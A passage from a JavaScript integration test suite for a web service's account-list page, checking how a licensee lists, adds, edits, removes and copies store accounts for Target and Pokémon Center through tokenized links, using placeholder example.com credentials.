    assert.match(webhookEdits.at(-1).content, /^🗑️ \*\*Took 2 accounts off your list\*\* for Use Assigned Account/);
    const again = await (await fetch(rmLink)).text();
    assert.match(again, /Took 2 off your list/); assert.doesNotMatch(again, new RegExp(other.replace(/\./g, "\\.")), "once decided, the page no longer lists them");
    const d = await accounts();
    assert.deepEqual(d.removals.slice(0, 2).map((x) => [x.status, x.count, x.removed]), [["kept", 1, null], ["removed", 3, 2]]);
    assert.ok(d.removals.every((x) => /\/accounts\/removal\//.test(x.review_url) && x.emails === undefined), "the admin list has links, never the emails");
  });
  await test("an ask nobody decided on expires, and its emails are dropped", async () => {
    const pc = await stock("*");
    const { m } = await askRemove(["pc1@outlook.com"]);
    const link = removalLink(m.content);
    await new Promise((ok) => setTimeout(ok, 8200));   // ACCOUNT_OFFER_TTL_MS is 8000 here
    const html = await (await removalPost(link, "remove")).text();
    assert.match(html, /Expired before you decided/); assert.doesNotMatch(html, /pc1@outlook\.com/);
    assert.deepEqual(await stock("*"), pc, "nothing removed");
  });

  console.log("\nSee my list (app 1.9.102+)");
  // The running worker can hold the database for a moment ("database is locked"): tried again then, up to 5 times.
  const d1Exec = (args, tries = 5) => {
    try { return execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), ...args], { cwd: root, env, stdio: "pipe" }); }
    catch (e) {
      if (tries > 1 && /SQLITE_BUSY|database is locked/.test(String(e.stderr || "") + String(e.stdout || ""))) { execFileSync("sleep", ["1"]); return d1Exec(args, tries - 1); }
      throw e;
    }
  };
  const dbRows = (cmd) => JSON.parse(d1Exec(["--command", cmd, "--json"]).toString())[0].results;
  const listLink = (content) => (content.match(/\((http[^)]+\/accounts\/list\/[^)]+)\)/) || [])[1];
  // wrangler dev closes a connection left idle while a test reads the database (dbRows takes a few seconds), and fetch
  // can reuse it just as it closes: tried again then (up to three times, as more than one can be left idle), as the request
  // never reached the worker.
  const fetchOnce = async (url, opts, tries = 3) => { try { return await fetch(url, opts); } catch (e) { if (tries > 1 && e.cause && e.cause.code === "UND_ERR_SOCKET") return fetchOnce(url, opts, tries - 1); throw e; } };
  const listStatus = async (url, opts) => { const r = await fetchOnce(url, opts); await r.text(); return r.status; };
  // Each body is read, so the connection is free for the next request.
  const view = async (link, q) => { const r = await fetchOnce(`${link}&${new URLSearchParams(q)}`); const body = await r.text(); return { status: r.status, text: async () => body }; };
  // A change sent without following its redirect: the 303 back to the list, and where it points.
  const sendRaw = async (link, body) => { const r = await fetchOnce(link.split("?")[0], { method: "POST", redirect: "manual", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) }); await r.text(); return { status: r.status, location: r.headers.get("location") || "" }; };
  const send = async (link, body) => { const r = await listPost(link, body); const text = await r.text(); return { status: r.status, text: async () => text }; };
  const page2 = async (r) => unescape(await r.text());
  const listPost = (link, body) => fetchOnce(link.split("?")[0], { method: "POST", body: new URLSearchParams({ t: new URL(link).searchParams.get("t"), ...body }) });
  const askList = async (key = ivanKey) => { const r = await fetchOnce(BASE + "/accounts/list", { method: "POST", headers: { authorization: "Bearer " + key, "content-type": "application/json" }, body: JSON.stringify({ name: "Owner" }) }); return { status: r.status, body: await r.json(), m: webhookPosts.at(-1) }; };
  const unescape = (h) => h.replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  const sqlRun = (cmd) => d1Exec(["--command", cmd]);
  // The one list's accounts and their slots' rows, as the page reads them, and the status it shows for each.
  const listRows = () => dbRows("SELECT store, email, email_norm, key_hash, key_last4, profile, batch, offer_id, sent_at, password FROM accounts");
  const fold = (x) => x.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
  const at = (x) => new Date(x).toISOString().replace("T", " ").slice(0, 16) + " UTC";
  const NAMES = { target: "Target", pokemoncenter: "Pokémon Center" };
  const sentText = (x) => x.sent_at ? `, sent ${at(x.sent_at)}` : ", in a batch being sent";
  const slotRowsOf = (rows, a) => rows.filter((u) => u.offer_id === "reuse:*" && u.email_norm === a.email_norm && u.key_hash === a.key_hash).sort((x, y) => (y.store > x.store) - (y.store < x.store));
  const listStatusOf = (rows, a) => { if (!a.key_hash) return "Free"; const us = slotRowsOf(rows, a);
    return `Given to license …${a.key_last4}${a.profile ? `, ${a.profile}` : ""}${us.length ? `: ${us.map((u) => NAMES[u.store] + sentText(u)).join("; ")}` : sentText(a)}`; };
  // A profile of Hana's on both stores, so its account has two slots' rows.
  const bothStores = async (name) => {
    const before = webhookPosts.length;
    const r = await fetchOnce(BASE + "/submissions", { method: "POST", headers: { authorization: "Bearer " + hanaKey, "content-type": "application/json" },
      body: JSON.stringify({ files: [tgFile([name]), pcFile([name])], name: "Hana", slots: 2, batch: "ls" + rid(),
        stores: [{ name: "Target", n: 1, seller: 1 }, { name: "Pokémon Center", n: 1, seller: 1 }] }) });
    assert.equal(r.status, 200, await r.clone().text()); await r.text();
    assert.ok(batchPost(before), "posted");
    const a = listRows().find((x) => x.store === "*" && x.profile === name); assert.ok(a, name + " has one");
    return a;
  };
  let lsLink, yEmail;
  await test("asking for the list needs a license; it posts a link to the channel, never an email", async () => {
    assert.equal((await slots("/accounts/list", null, {})).status, 401);
    const before = webhookPosts.length;
    const { status, body, m } = await askList();
    assert.equal(status, 200); assert.deepEqual(body, { status: "sent" });
    assert.equal(webhookPosts.length, before + 1);
    assert.match(m.content, /^📋 \*\*Your list for Use Assigned Account\*\*\nAsked by \*\*Owner\*\* · @ivan · license …\w{4}\n\[See or edit the list\]\(http[^)]+\/accounts\/list\/[A-Za-z0-9_-]+\?t=[A-Za-z0-9_-]+\) · the link works for 24 hours$/, m.content);
    assert.doesNotMatch(m.content, /@outlook\.com|@example\.com/, "no account in the channel");
    lsLink = listLink(m.content); assert.ok(lsLink);
  });
  await test("the page lists each account on the one list once, free or given, to whom and on which slots, never a password", async () => {
    const y = await bothStores("Hana Y"); yEmail = y.email;
    const rows = listRows(), mine = rows.filter((a) => a.offer_id !== "reuse:*");
    assert.ok(mine.length > 5 && mine.every((a) => a.store === "*") && mine.some((a) => !a.key_hash) && mine.some((a) => a.key_hash && a.sent_at), "a list with free and given accounts to show");
    const r = await fetchOnce(lsLink), html = await r.text(), text = unescape(html);
    assert.equal(r.status, 200); assert.equal(r.headers.get("cache-control"), "no-store");
    for (const a of mine) assert.equal(text.split(`<td class="em">${a.email}</td>`).length - 1, 1, "listed once, its slots' rows with it: " + a.email);
    assert.ok(text.includes('<input type="search" id="find"'), "a search box");
    // What the search looks in: the email, the stores and the status as the page writes it, lowercase, accents off.
    for (const a of mine) assert.ok(text.includes(`data-q="${fold(`${a.email} Target and Pokémon Center ${listStatusOf(rows, a)}`)}"`), "the search looks in its email, stores and status: " + a.email);
    assert.ok(text.includes(`data-q="${fold(yEmail)} target and pokemon center given to license`), "pokemon (no accent) finds it");
    for (const a of rows.filter((x) => x.password)) assert.ok(!text.includes(a.password), "never a password");
    const free = mine.filter((a) => !a.key_hash).length;
    assert.ok(text.includes(`<p class="who">${mine.length} accounts, ${free} free</p>`), "the total and how many are free");
    assert.ok(text.includes(`aria-label="Tick every Target and Pokémon Center account"> Target and Pokémon Center <span class="count">${free} free of ${mine.length}</span></h3>`), "the one list's count");
    const yt = rows.find((u) => u.offer_id === "reuse:*" && u.email_norm === y.email_norm && u.store === "target"), yp = rows.find((u) => u.offer_id === "reuse:*" && u.email_norm === y.email_norm && u.store === "pokemoncenter");
    assert.ok(text.includes(`Given to license …${hanaKey.slice(-4)}, Hana Y:<br>Target, sent ${at(yt.sent_at)}<br>Pokémon Center, sent ${at(yp.sent_at)}</td>`), "a given account says to whom, and which slots use it, a line each");
    assert.ok(text.includes("One list for Target and Pokémon Center: a buyer's slots at both stores for one profile get the same account, and no other buyer gets it while they have it."), "the page says how the list works");
    sqlRun(`UPDATE accounts SET sent_at = NULL WHERE store = 'pokemoncenter' AND email_norm = '${y.email_norm}'`);
    try {
      const t2 = unescape(await (await fetchOnce(lsLink)).text());
      assert.ok(t2.includes(`Hana Y:<br>Target, sent ${at(yt.sent_at)}<br>Pokémon Center, in a batch being sent</td>`), "a slot in a batch being sent says so");
    } finally {
      sqlRun(`UPDATE accounts SET sent_at = ${yp.sent_at} WHERE store = 'pokemoncenter' AND email_norm = '${y.email_norm}'`);
    }
    assert.equal((await listStatus(lsLink.replace(/t=[^&]+/, "t=wrong"))), 404, "a wrong token");
    assert.equal((await listStatus(lsLink.replace(/\/accounts\/list\/[^?]+/, "/accounts/list/nope1234"))), 404, "a wrong id");
  });
  await test("Remove asks first, then takes the account off the list with its slots' rows, and the page says so", async () => {
    const y = listRows().find((a) => a.store === "*" && a.email === yEmail), count = () => dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${y.email_norm}'`)[0].n;
    const ask = unescape(await (await listPost(lsLink, { action: "ask", email: yEmail.toUpperCase() })).text());
    assert.match(ask, /<h2>Remove an account<\/h2>/); assert.ok(ask.includes(yEmail), "names it");
    assert.ok(ask.includes(`Target and Pokémon Center: Given to license …${hanaKey.slice(-4)}, Hana Y: Target, sent `), "says where it is");
    assert.equal(ask.split("Pokémon Center:").length - 1, 1, "once: its slots' rows aren't listed apart");
    assert.match(ask, /It comes off every store's list it's on, so no more slots get it\./);
    assert.match(ask, /value="remove">Remove from my list<\/button>/); assert.match(ask, />Keep it<\/button>/);
    assert.equal(count(), 3, "the account and its two slots' rows; asking removes nothing");
    await view(lsLink, { action: "remove", email: yEmail });
    assert.equal(count(), 3, "a link (GET) removes nothing");
    const rm = await sendRaw(lsLink, { action: "remove", email: yEmail });
    assert.equal(rm.status, 303); assert.match(rm.location, /\?t=[^&]+&done=Took\+/, "back to the list by its link");
    const done = unescape(await (await fetchOnce(new URL(rm.location, lsLink))).text());
    assert.ok(done.includes(`<p>Took ${yEmail} off your list.</p>`), "the page says it");
    assert.ok(!done.includes(`<td class="em">${yEmail}</td>`), "and no longer lists it");
    assert.equal(count(), 0, "off the list, with its slots' rows");
    const again = unescape(await (await listPost(lsLink, { action: "remove", email: yEmail })).text());
    assert.ok(again.includes(`<p>${yEmail.toLowerCase()} isn't on your list any more.</p>`), "removing it twice changes nothing");
    const wrong = await listPost(lsLink.replace(/t=[^&]+/, "t=wrong"), { action: "remove", email: yEmail });
    await wrong.text(); assert.equal(wrong.status, 404, "never without the token");
  });
  await test("Edit changes a free account's password, and never shows one", async () => {
    const rows = listRows();
    const a = rows.find((x) => !x.key_hash && x.store === "*");
    const ed = await view(lsLink, { action: "edit", store: a.store, email: a.email_norm });
    const html = await page2(ed);
    assert.equal(ed.status, 200); assert.match(html, /<h2>Edit an account<\/h2>/);
    assert.ok(html.includes(`<p class="small">Target and Pokémon Center: Free</p>`), "where it is");
    assert.ok(html.includes(`name="new_email" value="${a.email}"`), "its email, to change");
    assert.doesNotMatch(html, /name="new_email"[^>]*readonly/, "a free one's email can change");
    assert.doesNotMatch(html, /Give it back/, "nothing to give back");
    assert.ok(html.includes("The store account's password: Target's logins file gets it, and Pokémon Center checks out as a guest with the email."), "what the password is for");
    for (const x of rows) assert.ok(!html.includes(x.password), "never a password");
    const done = await page2(await send(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: " Fresh-pass-1 " }));
    assert.ok(done.includes(`<p>Changed the password of ${a.email} on your list.</p>`), done.slice(0, 600));
    assert.ok(!done.includes("Fresh-pass-1"), "and doesn't show it");
    const b = dbRows(`SELECT email, password, key_hash FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0];
    assert.equal(b.password, "Fresh-pass-1"); assert.equal(b.email, a.email); assert.equal(b.key_hash, null);
    const raw = await fetchOnce(lsLink.split("?")[0], { method: "POST", redirect: "manual", body: new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "" }) });
    await raw.text();
    assert.equal(raw.status, 303, "a change goes back to the list by its link, so reloading doesn't send it again");
    assert.match(raw.headers.get("location"), /^\/accounts\/list\/[^?]+\?t=[^&]+&done=Nothing\+changed\.$/);
    const nl = await page2(await send(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "two\nlines" }));
    assert.ok(nl.includes(`<p class="err">That password can't have a line break.</p>`), "a password with a line break would split the logins file");
    const viaGet = await view(lsLink, { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "by-get" });
    assert.equal(viaGet.status, 200);
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0].password, "Fresh-pass-1", "a link (GET) never changes anything");
    assert.equal((await send(lsLink.replace(/t=[^&]+/, "t=wrong"), { action: "save", store: a.store, email: a.email_norm, new_email: a.email, password: "x" })).status, 404);
  });
  await test("a free account's email can change; one already on the list, or not an email, is refused", async () => {
    const rows = listRows().filter((x) => x.store === "*");
    const [a, other] = [rows.find((x) => !x.key_hash), rows.find((x) => x.key_hash)];
    assert.ok(a && other, "a free account and a given one");
    const dup = await page2(await send(lsLink, { action: "save", store: "*", email: a.email_norm, new_email: other.email.toUpperCase(), password: "" }));
    assert.ok(dup.includes(`<p class="err">${other.email.toUpperCase()} is already on your list.</p>`), dup.slice(0, 600));
    const bad = await page2(await send(lsLink, { action: "save", store: "*", email: a.email_norm, new_email: "not an email", password: "" }));
    assert.ok(bad.includes(`<p class="err">That isn't an email address.</p>`));
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0].n, 1, "unchanged");
    const done = await page2(await send(lsLink, { action: "save", store: "*", email: a.email_norm, new_email: "Fixed.Name@example.com", password: "new-pw-2" }));
    assert.ok(done.includes(`<p>Changed ${a.email} to Fixed.Name@example.com, with its new password, on your list.</p>`), done.slice(0, 600));
    assert.ok(done.includes(`<td class="em">Fixed.Name@example.com</td>`) && !done.includes(`<td class="em">${a.email}</td>`), "listed under its new email");
    assert.deepEqual(dbRows("SELECT email, password, key_hash FROM accounts WHERE store = '*' AND email_norm = 'fixed.name@example.com'")[0], { email: "Fixed.Name@example.com", password: "new-pw-2", key_hash: null });
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm = '${a.email_norm}'`)[0].n, 0, "the old email is gone");
  });
  await test("a given account keeps its email and gets a new password (its slots' rows too), and can be given back to the list", async () => {
    const a = await bothStores("Hana X");
    const uses = () => dbRows(`SELECT store, password FROM accounts WHERE email_norm = '${a.email_norm}' AND offer_id = 'reuse:*' ORDER BY store`);
    assert.equal(uses().length, 2, "its Target and Pokémon Center slots' rows");
    const html = await page2(await view(lsLink, { action: "edit", store: "*", email: a.email_norm }));
    assert.match(html, /name="new_email"[^>]*readonly/, "its email can't change");
    assert.ok(html.includes(`Target and Pokémon Center: Given to license …${a.key_last4}, Hana X: Target, sent `), html.slice(0, 900));
    assert.ok(html.includes("Give it back to my list") && html.includes(`License …${a.key_last4} keeps what was posted to your channel, and stops getting order alerts for it. Their Target and Pokémon Center slots lose it too.`), html.slice(0, 1200));
    const ru = await page2(await view(lsLink, { action: "edit", store: "target", email: a.email_norm }));
    assert.ok(ru.includes("It's an account from your list, on this buyer's Target slot, so it follows that one: change it on your list.") && !ru.includes('name="password"'), "a slot's row is changed through its account");
    const forgedUse = await page2(await send(lsLink, { action: "save", store: "target", email: a.email_norm, new_email: a.email, password: "sneaky" }));
    assert.ok(forgedUse.includes("It's an account from your list: change it there."));
    assert.ok(uses().every((u) => u.password !== "sneaky"));
    const forged = await page2(await send(lsLink, { action: "save", store: "*", email: a.email_norm, new_email: "someone.else@example.com", password: "" }));
    assert.ok(forged.includes("<p class=\"err\">It's on a buyer's slot, so its email can't change. Give it back to your list first.</p>"));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'someone.else@example.com'")[0].n, 0);
    const saved = await page2(await send(lsLink, { action: "save", store: "*", email: a.email_norm, new_email: a.email, password: "given-pw-3" }));
    assert.ok(saved.includes(`<p>Changed the password of ${a.email} on your list.</p>`));
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0].password, "given-pw-3");
    assert.deepEqual(uses().map((u) => u.password), ["given-pw-3", "given-pw-3"], "its slots check out with the new one too");
    await view(lsLink, { action: "giveback", store: "*", email: a.email_norm });
    assert.equal(dbRows(`SELECT key_hash FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0].key_hash, a.key_hash, "a link (GET) gives nothing back");
    const gb = await sendRaw(lsLink, { action: "giveback", store: "*", email: a.email_norm });
    assert.equal(gb.status, 303); assert.match(gb.location, /\?t=[^&]+&done=Gave\+/, "back to the list, saying so");
    const done = await page2(await view(lsLink, Object.fromEntries(new URLSearchParams(gb.location.split("?")[1]).entries())));
    assert.ok(done.includes(`<p>Gave ${a.email} back to your list. It's free for the next slot.</p>`), done.slice(0, 600));
    assert.deepEqual(dbRows(`SELECT key_hash, batch, profile, password FROM accounts WHERE store = '*' AND email_norm = '${a.email_norm}'`)[0],
      { key_hash: null, batch: null, profile: null, password: "given-pw-3" }, "free, with its password");
    assert.deepEqual(uses(), [], "its slots' rows are dropped");
    const again = await page2(await send(lsLink, { action: "giveback", store: "*", email: a.email_norm }));
    assert.ok(again.includes(`<p>${a.email} is already free on your list.</p>`));
    const old = await page2(await view(lsLink, { action: "edit", store: "target", email: a.email_norm }));
    assert.ok(old.includes(`isn't on your Target list any more.`), "its Target slot's old link says it's gone");
  });
  await test("Add puts accounts on the one list, says which lines it couldn't read, and never changes one already there", async () => {
    const page0 = await page2(await view(lsLink, {}));
    assert.ok(page0.includes('<p class="small">They go on your list, for Target and Pokémon Center both.</p>') && !page0.includes('<select name="store">'), "nothing to pick: one list");
    assert.ok(page0.includes("The store account's password: Target's logins file gets email:password, and Pokémon Center checks out as a guest with the email."));
    const ex = dbRows("SELECT email, email_norm, password FROM accounts WHERE store = '*'")[0];
    const before = dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n;
    const lines = ["added.one@example.com:pw-one", "added.two@example.com,pw-two", "broken line", "added.three@example.com",
      `${ex.email}:other-pw`, "added.one@example.com:dup", "added.four@example.com:acct-pw:added.four.inbox@example.com:inbox-pw"].join("\n");
    await view(lsLink, { action: "add", accounts: lines, password: "" });
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n, before, "a link (GET) adds nothing");
    const ad = await sendRaw(lsLink, { action: "add", accounts: lines, password: "" });
    assert.equal(ad.status, 303); assert.match(ad.location, /\?t=[^&]+&done=Added\+3[^&]*&err=Line\+3[^&]*$/, "back to the list with what happened");
    const html = await page2(await view(lsLink, Object.fromEntries(new URLSearchParams(ad.location.split("?")[1]).entries())));
    assert.ok(html.includes("<p>Added 3 to your list. 1 was already on it, and kept its password (Edit changes one).</p>"), html.slice(0, 900));
    assert.ok(html.includes(`<p class="err">Line 3 couldn't be read: write each account as email:password. Line 4 has only an email: add it again with the password box filled in.</p>`), html.slice(0, 900));
    for (const pw of ["pw-one", "pw-two", "acct-pw", "inbox-pw", "other-pw"]) assert.ok(!html.includes(pw), "no password on the page: " + pw);
    const id = lsLink.match(/\/accounts\/list\/([^?]+)/)[1];
    assert.deepEqual(dbRows("SELECT store, email, password, key_hash, offer_id FROM accounts WHERE email_norm LIKE 'added.%' ORDER BY email_norm"), [
      { store: "*", email: "added.four@example.com", password: "acct-pw", key_hash: null, offer_id: "list:" + id },
      { store: "*", email: "added.one@example.com", password: "pw-one", key_hash: null, offer_id: "list:" + id },
      { store: "*", email: "added.two@example.com", password: "pw-two", key_hash: null, offer_id: "list:" + id }]);
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = '*' AND email_norm = '${ex.email_norm}'`)[0].password, ex.password, "one already there keeps its password");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n, before + 3);
    const shared = await page2(await send(lsLink, { action: "add", store: "target", accounts: "added.three@example.com\n", password: "shared-pw" }));
    assert.ok(shared.includes("<p>Added 1 to your list.</p>"), "an email alone takes the password box's; Target's means the one list");
    assert.deepEqual(dbRows("SELECT store, password FROM accounts WHERE email_norm = 'added.three@example.com'"), [{ store: "*", password: "shared-pw" }]);
    // Lines as FAFO's Send accounts writes them, or a spreadsheet exports them: quoted cells, empty inbox columns, a
    // first line naming the columns. A quoted email is never taken as one.
    const csvLines = ['email,password', '"quoted.one@example.com","p:ss"', 'quoted.two@example.com,"p,ss"', 'quoted.three@example.com,"a""b"',
      'trailing@example.com,pw-t,,', '"bad"@example.com:pw', 'stray@example.com,my"pass', 'tabbed@example.com\t"p""w"'].join("\r\n");
    const qd = await page2(await send(lsLink, { action: "add", accounts: csvLines, password: "" }));
    assert.ok(qd.includes("<p>Added 5 to your list.</p>") && qd.includes(`<p class="err">Lines 6, 7 couldn't be read: write each account as email:password.</p>`), qd.slice(0, 900));
    assert.deepEqual(dbRows("SELECT email, password FROM accounts WHERE store = '*' AND (email_norm LIKE 'quoted.%' OR email_norm IN ('trailing@example.com', 'tabbed@example.com')) ORDER BY email_norm"), [
      { email: "quoted.one@example.com", password: "p:ss" }, { email: "quoted.three@example.com", password: 'a"b' },
      { email: "quoted.two@example.com", password: "p,ss" }, { email: "tabbed@example.com", password: 'p"w' }, { email: "trailing@example.com", password: "pw-t" }]);
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'stray@example.com'")[0].n, 0, "a stray quote is reported, not read as another password");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email LIKE '%"%'`)[0].n, 0, "no email with quotes in it");
    const nowhere = await page2(await send(lsLink, { action: "add", store: "nowhere", accounts: "added.five@example.com:pw" }));
    assert.ok(nowhere.includes(`<p class="err">Pick a store to add them to.</p>`));
    const empty = await page2(await send(lsLink, { action: "add", accounts: "  \n" }));
    assert.ok(empty.includes(`<p class="err">Paste the accounts to add, one per line.</p>`));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'added.five@example.com'")[0].n, 0);
  });
  await test("with a store's own list on the page too, Add asks which list they go on", async () => {
    sqlRun(`INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id) VALUES ('walmart', 'Own.One@example.com', 'own.one@example.com', 'own-pw', 1, 'x')`);
    try {
      const p = await page2(await view(lsLink, {}));
      assert.ok(p.includes(`<label>Add to<select name="store"><option value="*" selected>Your list (Target and Pokémon Center)</option><option value="walmart">Walmart's own list</option></select></label>`), p.slice(-2500));
      assert.ok(p.includes('aria-label="Tick every Walmart account"> Walmart <span class="count">1 free of 1</span>'), "its own section");
      const ad = await sendRaw(lsLink, { action: "add", store: "walmart", accounts: "own.two@example.com:pw2" });
      assert.match(ad.location, /&store=walmart$/, "it stays picked");
      const html = await page2(await view(lsLink, Object.fromEntries(new URLSearchParams(ad.location.split("?")[1]).entries())));
      assert.ok(html.includes("<p>Added 1 to your Walmart list.</p>") && html.includes('<option value="walmart" selected>'), html.slice(0, 900));
      assert.deepEqual(dbRows("SELECT store FROM accounts WHERE email_norm = 'own.two@example.com'"), [{ store: "walmart" }]);
    } finally {
      sqlRun("DELETE FROM accounts WHERE store = 'walmart'");
    }
  });
  await test("ticked accounts are removed together: it asks first, naming each once, then takes them off the list", async () => {
    const g = await bothStores("Hana W");
    const page0 = await page2(await view(lsLink, {}));
    const rows = listRows(), mine = rows.filter((a) => a.offer_id !== "reuse:*");
    for (const a of mine) assert.ok(page0.includes(`name="pick" form="bulk" value="${a.store} ${a.email_norm}"`), "a tick box for each: " + a.email);
    assert.ok(!rows.filter((a) => a.offer_id === "reuse:*").some((u) => page0.includes(`value="${u.store} ${u.email_norm}"`)), "none for a slot's row");
    assert.ok(page0.includes('<form id="bulk" method="post" class="bulk"') && page0.includes('value="ask-many">Remove</button>') && page0.includes("data-copy=\"logins\""), "the bar");
    for (const a of rows) assert.ok(!page0.includes(a.password), "never a password");
    const count = (es) => dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email_norm IN (${es.map((e) => `'${e}'`).join(", ")})`)[0].n;
    const free = mine.filter((a) => !a.key_hash).slice(0, 2);
    assert.equal(free.length, 2);
    const picked = [g, ...free].map((a) => `* ${a.email_norm}`).concat(["* nobody.here@example.com"]), emails = [g, ...free].map((a) => a.email_norm);
    const noneRaw = await sendRaw(lsLink, { action: "ask-many" });
    assert.equal(noneRaw.status, 303, "nothing ticked goes back to the list by its link");
    const none = await page2(await send(lsLink, { action: "ask-many" }));
    assert.ok(none.includes(`<p class="err">Tick the accounts to remove first.</p>`), "nothing ticked");
    const askBody = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "ask-many" }); picked.forEach((x) => askBody.append("pick", x));
    const ask = unescape(await (await fetchOnce(lsLink.split("?")[0], { method: "POST", body: askBody })).text());
    assert.ok(ask.includes("<h2>Remove accounts</h2>") && ask.includes('<p class="who">3 accounts</p>') && ask.includes("1 of the ones ticked isn't on your list any more.")
      && ask.includes('value="remove">Remove 3 from my list</button>') && ask.includes(">Keep them</button>"), ask.slice(0, 1500));
    for (const a of [g, ...free]) assert.ok(ask.includes(`<input type="hidden" name="email" value="${a.email_norm}">`) && ask.includes(`${a.email} · Target and Pokémon Center: `), "names " + a.email);
    assert.ok(ask.includes(`${free[0].email} · Target and Pokémon Center: Free`) && ask.includes(`${g.email} · Target and Pokémon Center: Given to license …${g.key_last4}, Hana W: Target, sent `), "and says where each one is", ask.slice(0, 1500));
    assert.equal(count(emails), 5, "asking removes nothing: the three, and Hana W's two slots' rows");
    await view(lsLink, { action: "remove", email: free[0].email_norm });
    assert.equal(count([free[0].email_norm]), 1, "a link (GET) removes nothing");
    const rmBody = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "remove" }); emails.forEach((e) => rmBody.append("email", e)); rmBody.append("email", "nobody.here@example.com");
    const rm = await fetchOnce(lsLink.split("?")[0], { method: "POST", redirect: "manual", body: rmBody }); await rm.text();
    assert.equal(rm.status, 303);
    const done = unescape(await (await fetchOnce(new URL(rm.headers.get("location"), lsLink))).text());
    assert.ok(done.includes("<p>Took 3 accounts off your list. 1 wasn't on it any more.</p>"), done.slice(0, 600));
    assert.equal(count(emails), 0, "off the list, with Hana W's slots' rows");
    const empty = await page2(await send(lsLink, { action: "remove" }));
    assert.ok(empty.includes(`<p class="err">Tick the accounts to remove first.</p>`), "Remove with nothing ticked says so");
    const twice = await fetchOnce(lsLink.split("?")[0], { method: "POST", body: rmBody });
    assert.ok(unescape(await twice.text()).includes("<p>Those 4 weren't on your list any more.</p>"), "removing them again changes nothing");
  });
  await test("Copy email:password answers only a POST with the link's token, in the order ticked, and never goes in the page", async () => {
    const rows = dbRows("SELECT store, email, email_norm, password FROM accounts WHERE COALESCE(offer_id, '') NOT LIKE 'reuse:%' ORDER BY store, email_norm").slice(0, 3);
    assert.equal(rows.length, 3);
    const body = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "copy" });
    [rows[2], rows[0], rows[1]].forEach((a) => body.append("pick", `${a.store} ${a.email_norm}`)); body.append("pick", "* nobody.here@example.com"); body.append("pick", `${rows[0].store} ${rows[0].email_norm}`);
    const r = await fetchOnce(lsLink.split("?")[0], { method: "POST", body }), d = await r.json();
    assert.equal(r.status, 200); assert.equal(r.headers.get("cache-control"), "no-store"); assert.equal(r.headers.get("access-control-allow-origin"), null, "no other site can read it");
    assert.deepEqual(d, { lines: [rows[2], rows[0], rows[1]].map((a) => `${a.email}:${a.password}`), missing: 1, over: 0 }, "in the order ticked, once each");
    const wrong = new URLSearchParams(body); wrong.set("t", "wrong-token");
    const w = await fetchOnce(lsLink.split("?")[0], { method: "POST", body: wrong }), wt = await w.text();
    assert.equal(w.status, 404); assert.ok(!wt.includes(rows[0].password), "never without the token");
    const g = await page2(await view(lsLink, { action: "copy", pick: `${rows[0].store} ${rows[0].email_norm}` }));
    assert.ok(g.includes("<h2>Your list for Use Assigned Account</h2>") && !g.includes(rows[0].password), "a link (GET) shows the list, never a password");
  });
  await test("ticks work on a typed store whose name has a | or spaces, and past 5000 ticked the page says how many it left out", async () => {
    sqlRun(`INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id) VALUES ('other:a|b c', 'Typed.One@example.com', 'typed.one@example.com', 'typed-pw', 1, 'x')`);
    const page1 = await page2(await view(lsLink, {}));
    assert.ok(page1.includes('value="other:a|b c typed.one@example.com"'), "its tick");
    const one = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "copy" }); one.append("pick", "other:a|b c typed.one@example.com");
    assert.deepEqual(await (await fetchOnce(lsLink.split("?")[0], { method: "POST", body: one })).json(), { lines: ["Typed.One@example.com:typed-pw"], missing: 0, over: 0 });
    // 5003 ticked: Copy takes 5000 and says how many more; Remove's question says so too.
    sqlRun(`WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 5002)
      INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id) SELECT 'bulktest', 'bulk' || i || '@example.com', 'bulk' || i || '@example.com', 'pw' || i, 1, 'x' FROM n`);
    try {
      const many = new URLSearchParams({ t: new URL(lsLink).searchParams.get("t"), action: "copy" });
      for (let i = 1; i <= 5002; i++) many.append("pick", `bulktest bulk${i}@example.com`);
      many.append("pick", "other:a|b c typed.one@example.com");
      const d = await (await fetchOnce(lsLink.split("?")[0], { method: "POST", body: many })).json();
      assert.equal(d.lines.length, 5000); assert.equal(d.over, 3); assert.equal(d.missing, 0); assert.equal(d.lines[0], "bulk1@example.com:pw1");
      many.set("action", "ask-many");
      const ask = unescape(await (await fetchOnce(lsLink.split("?")[0], { method: "POST", body: many })).text());
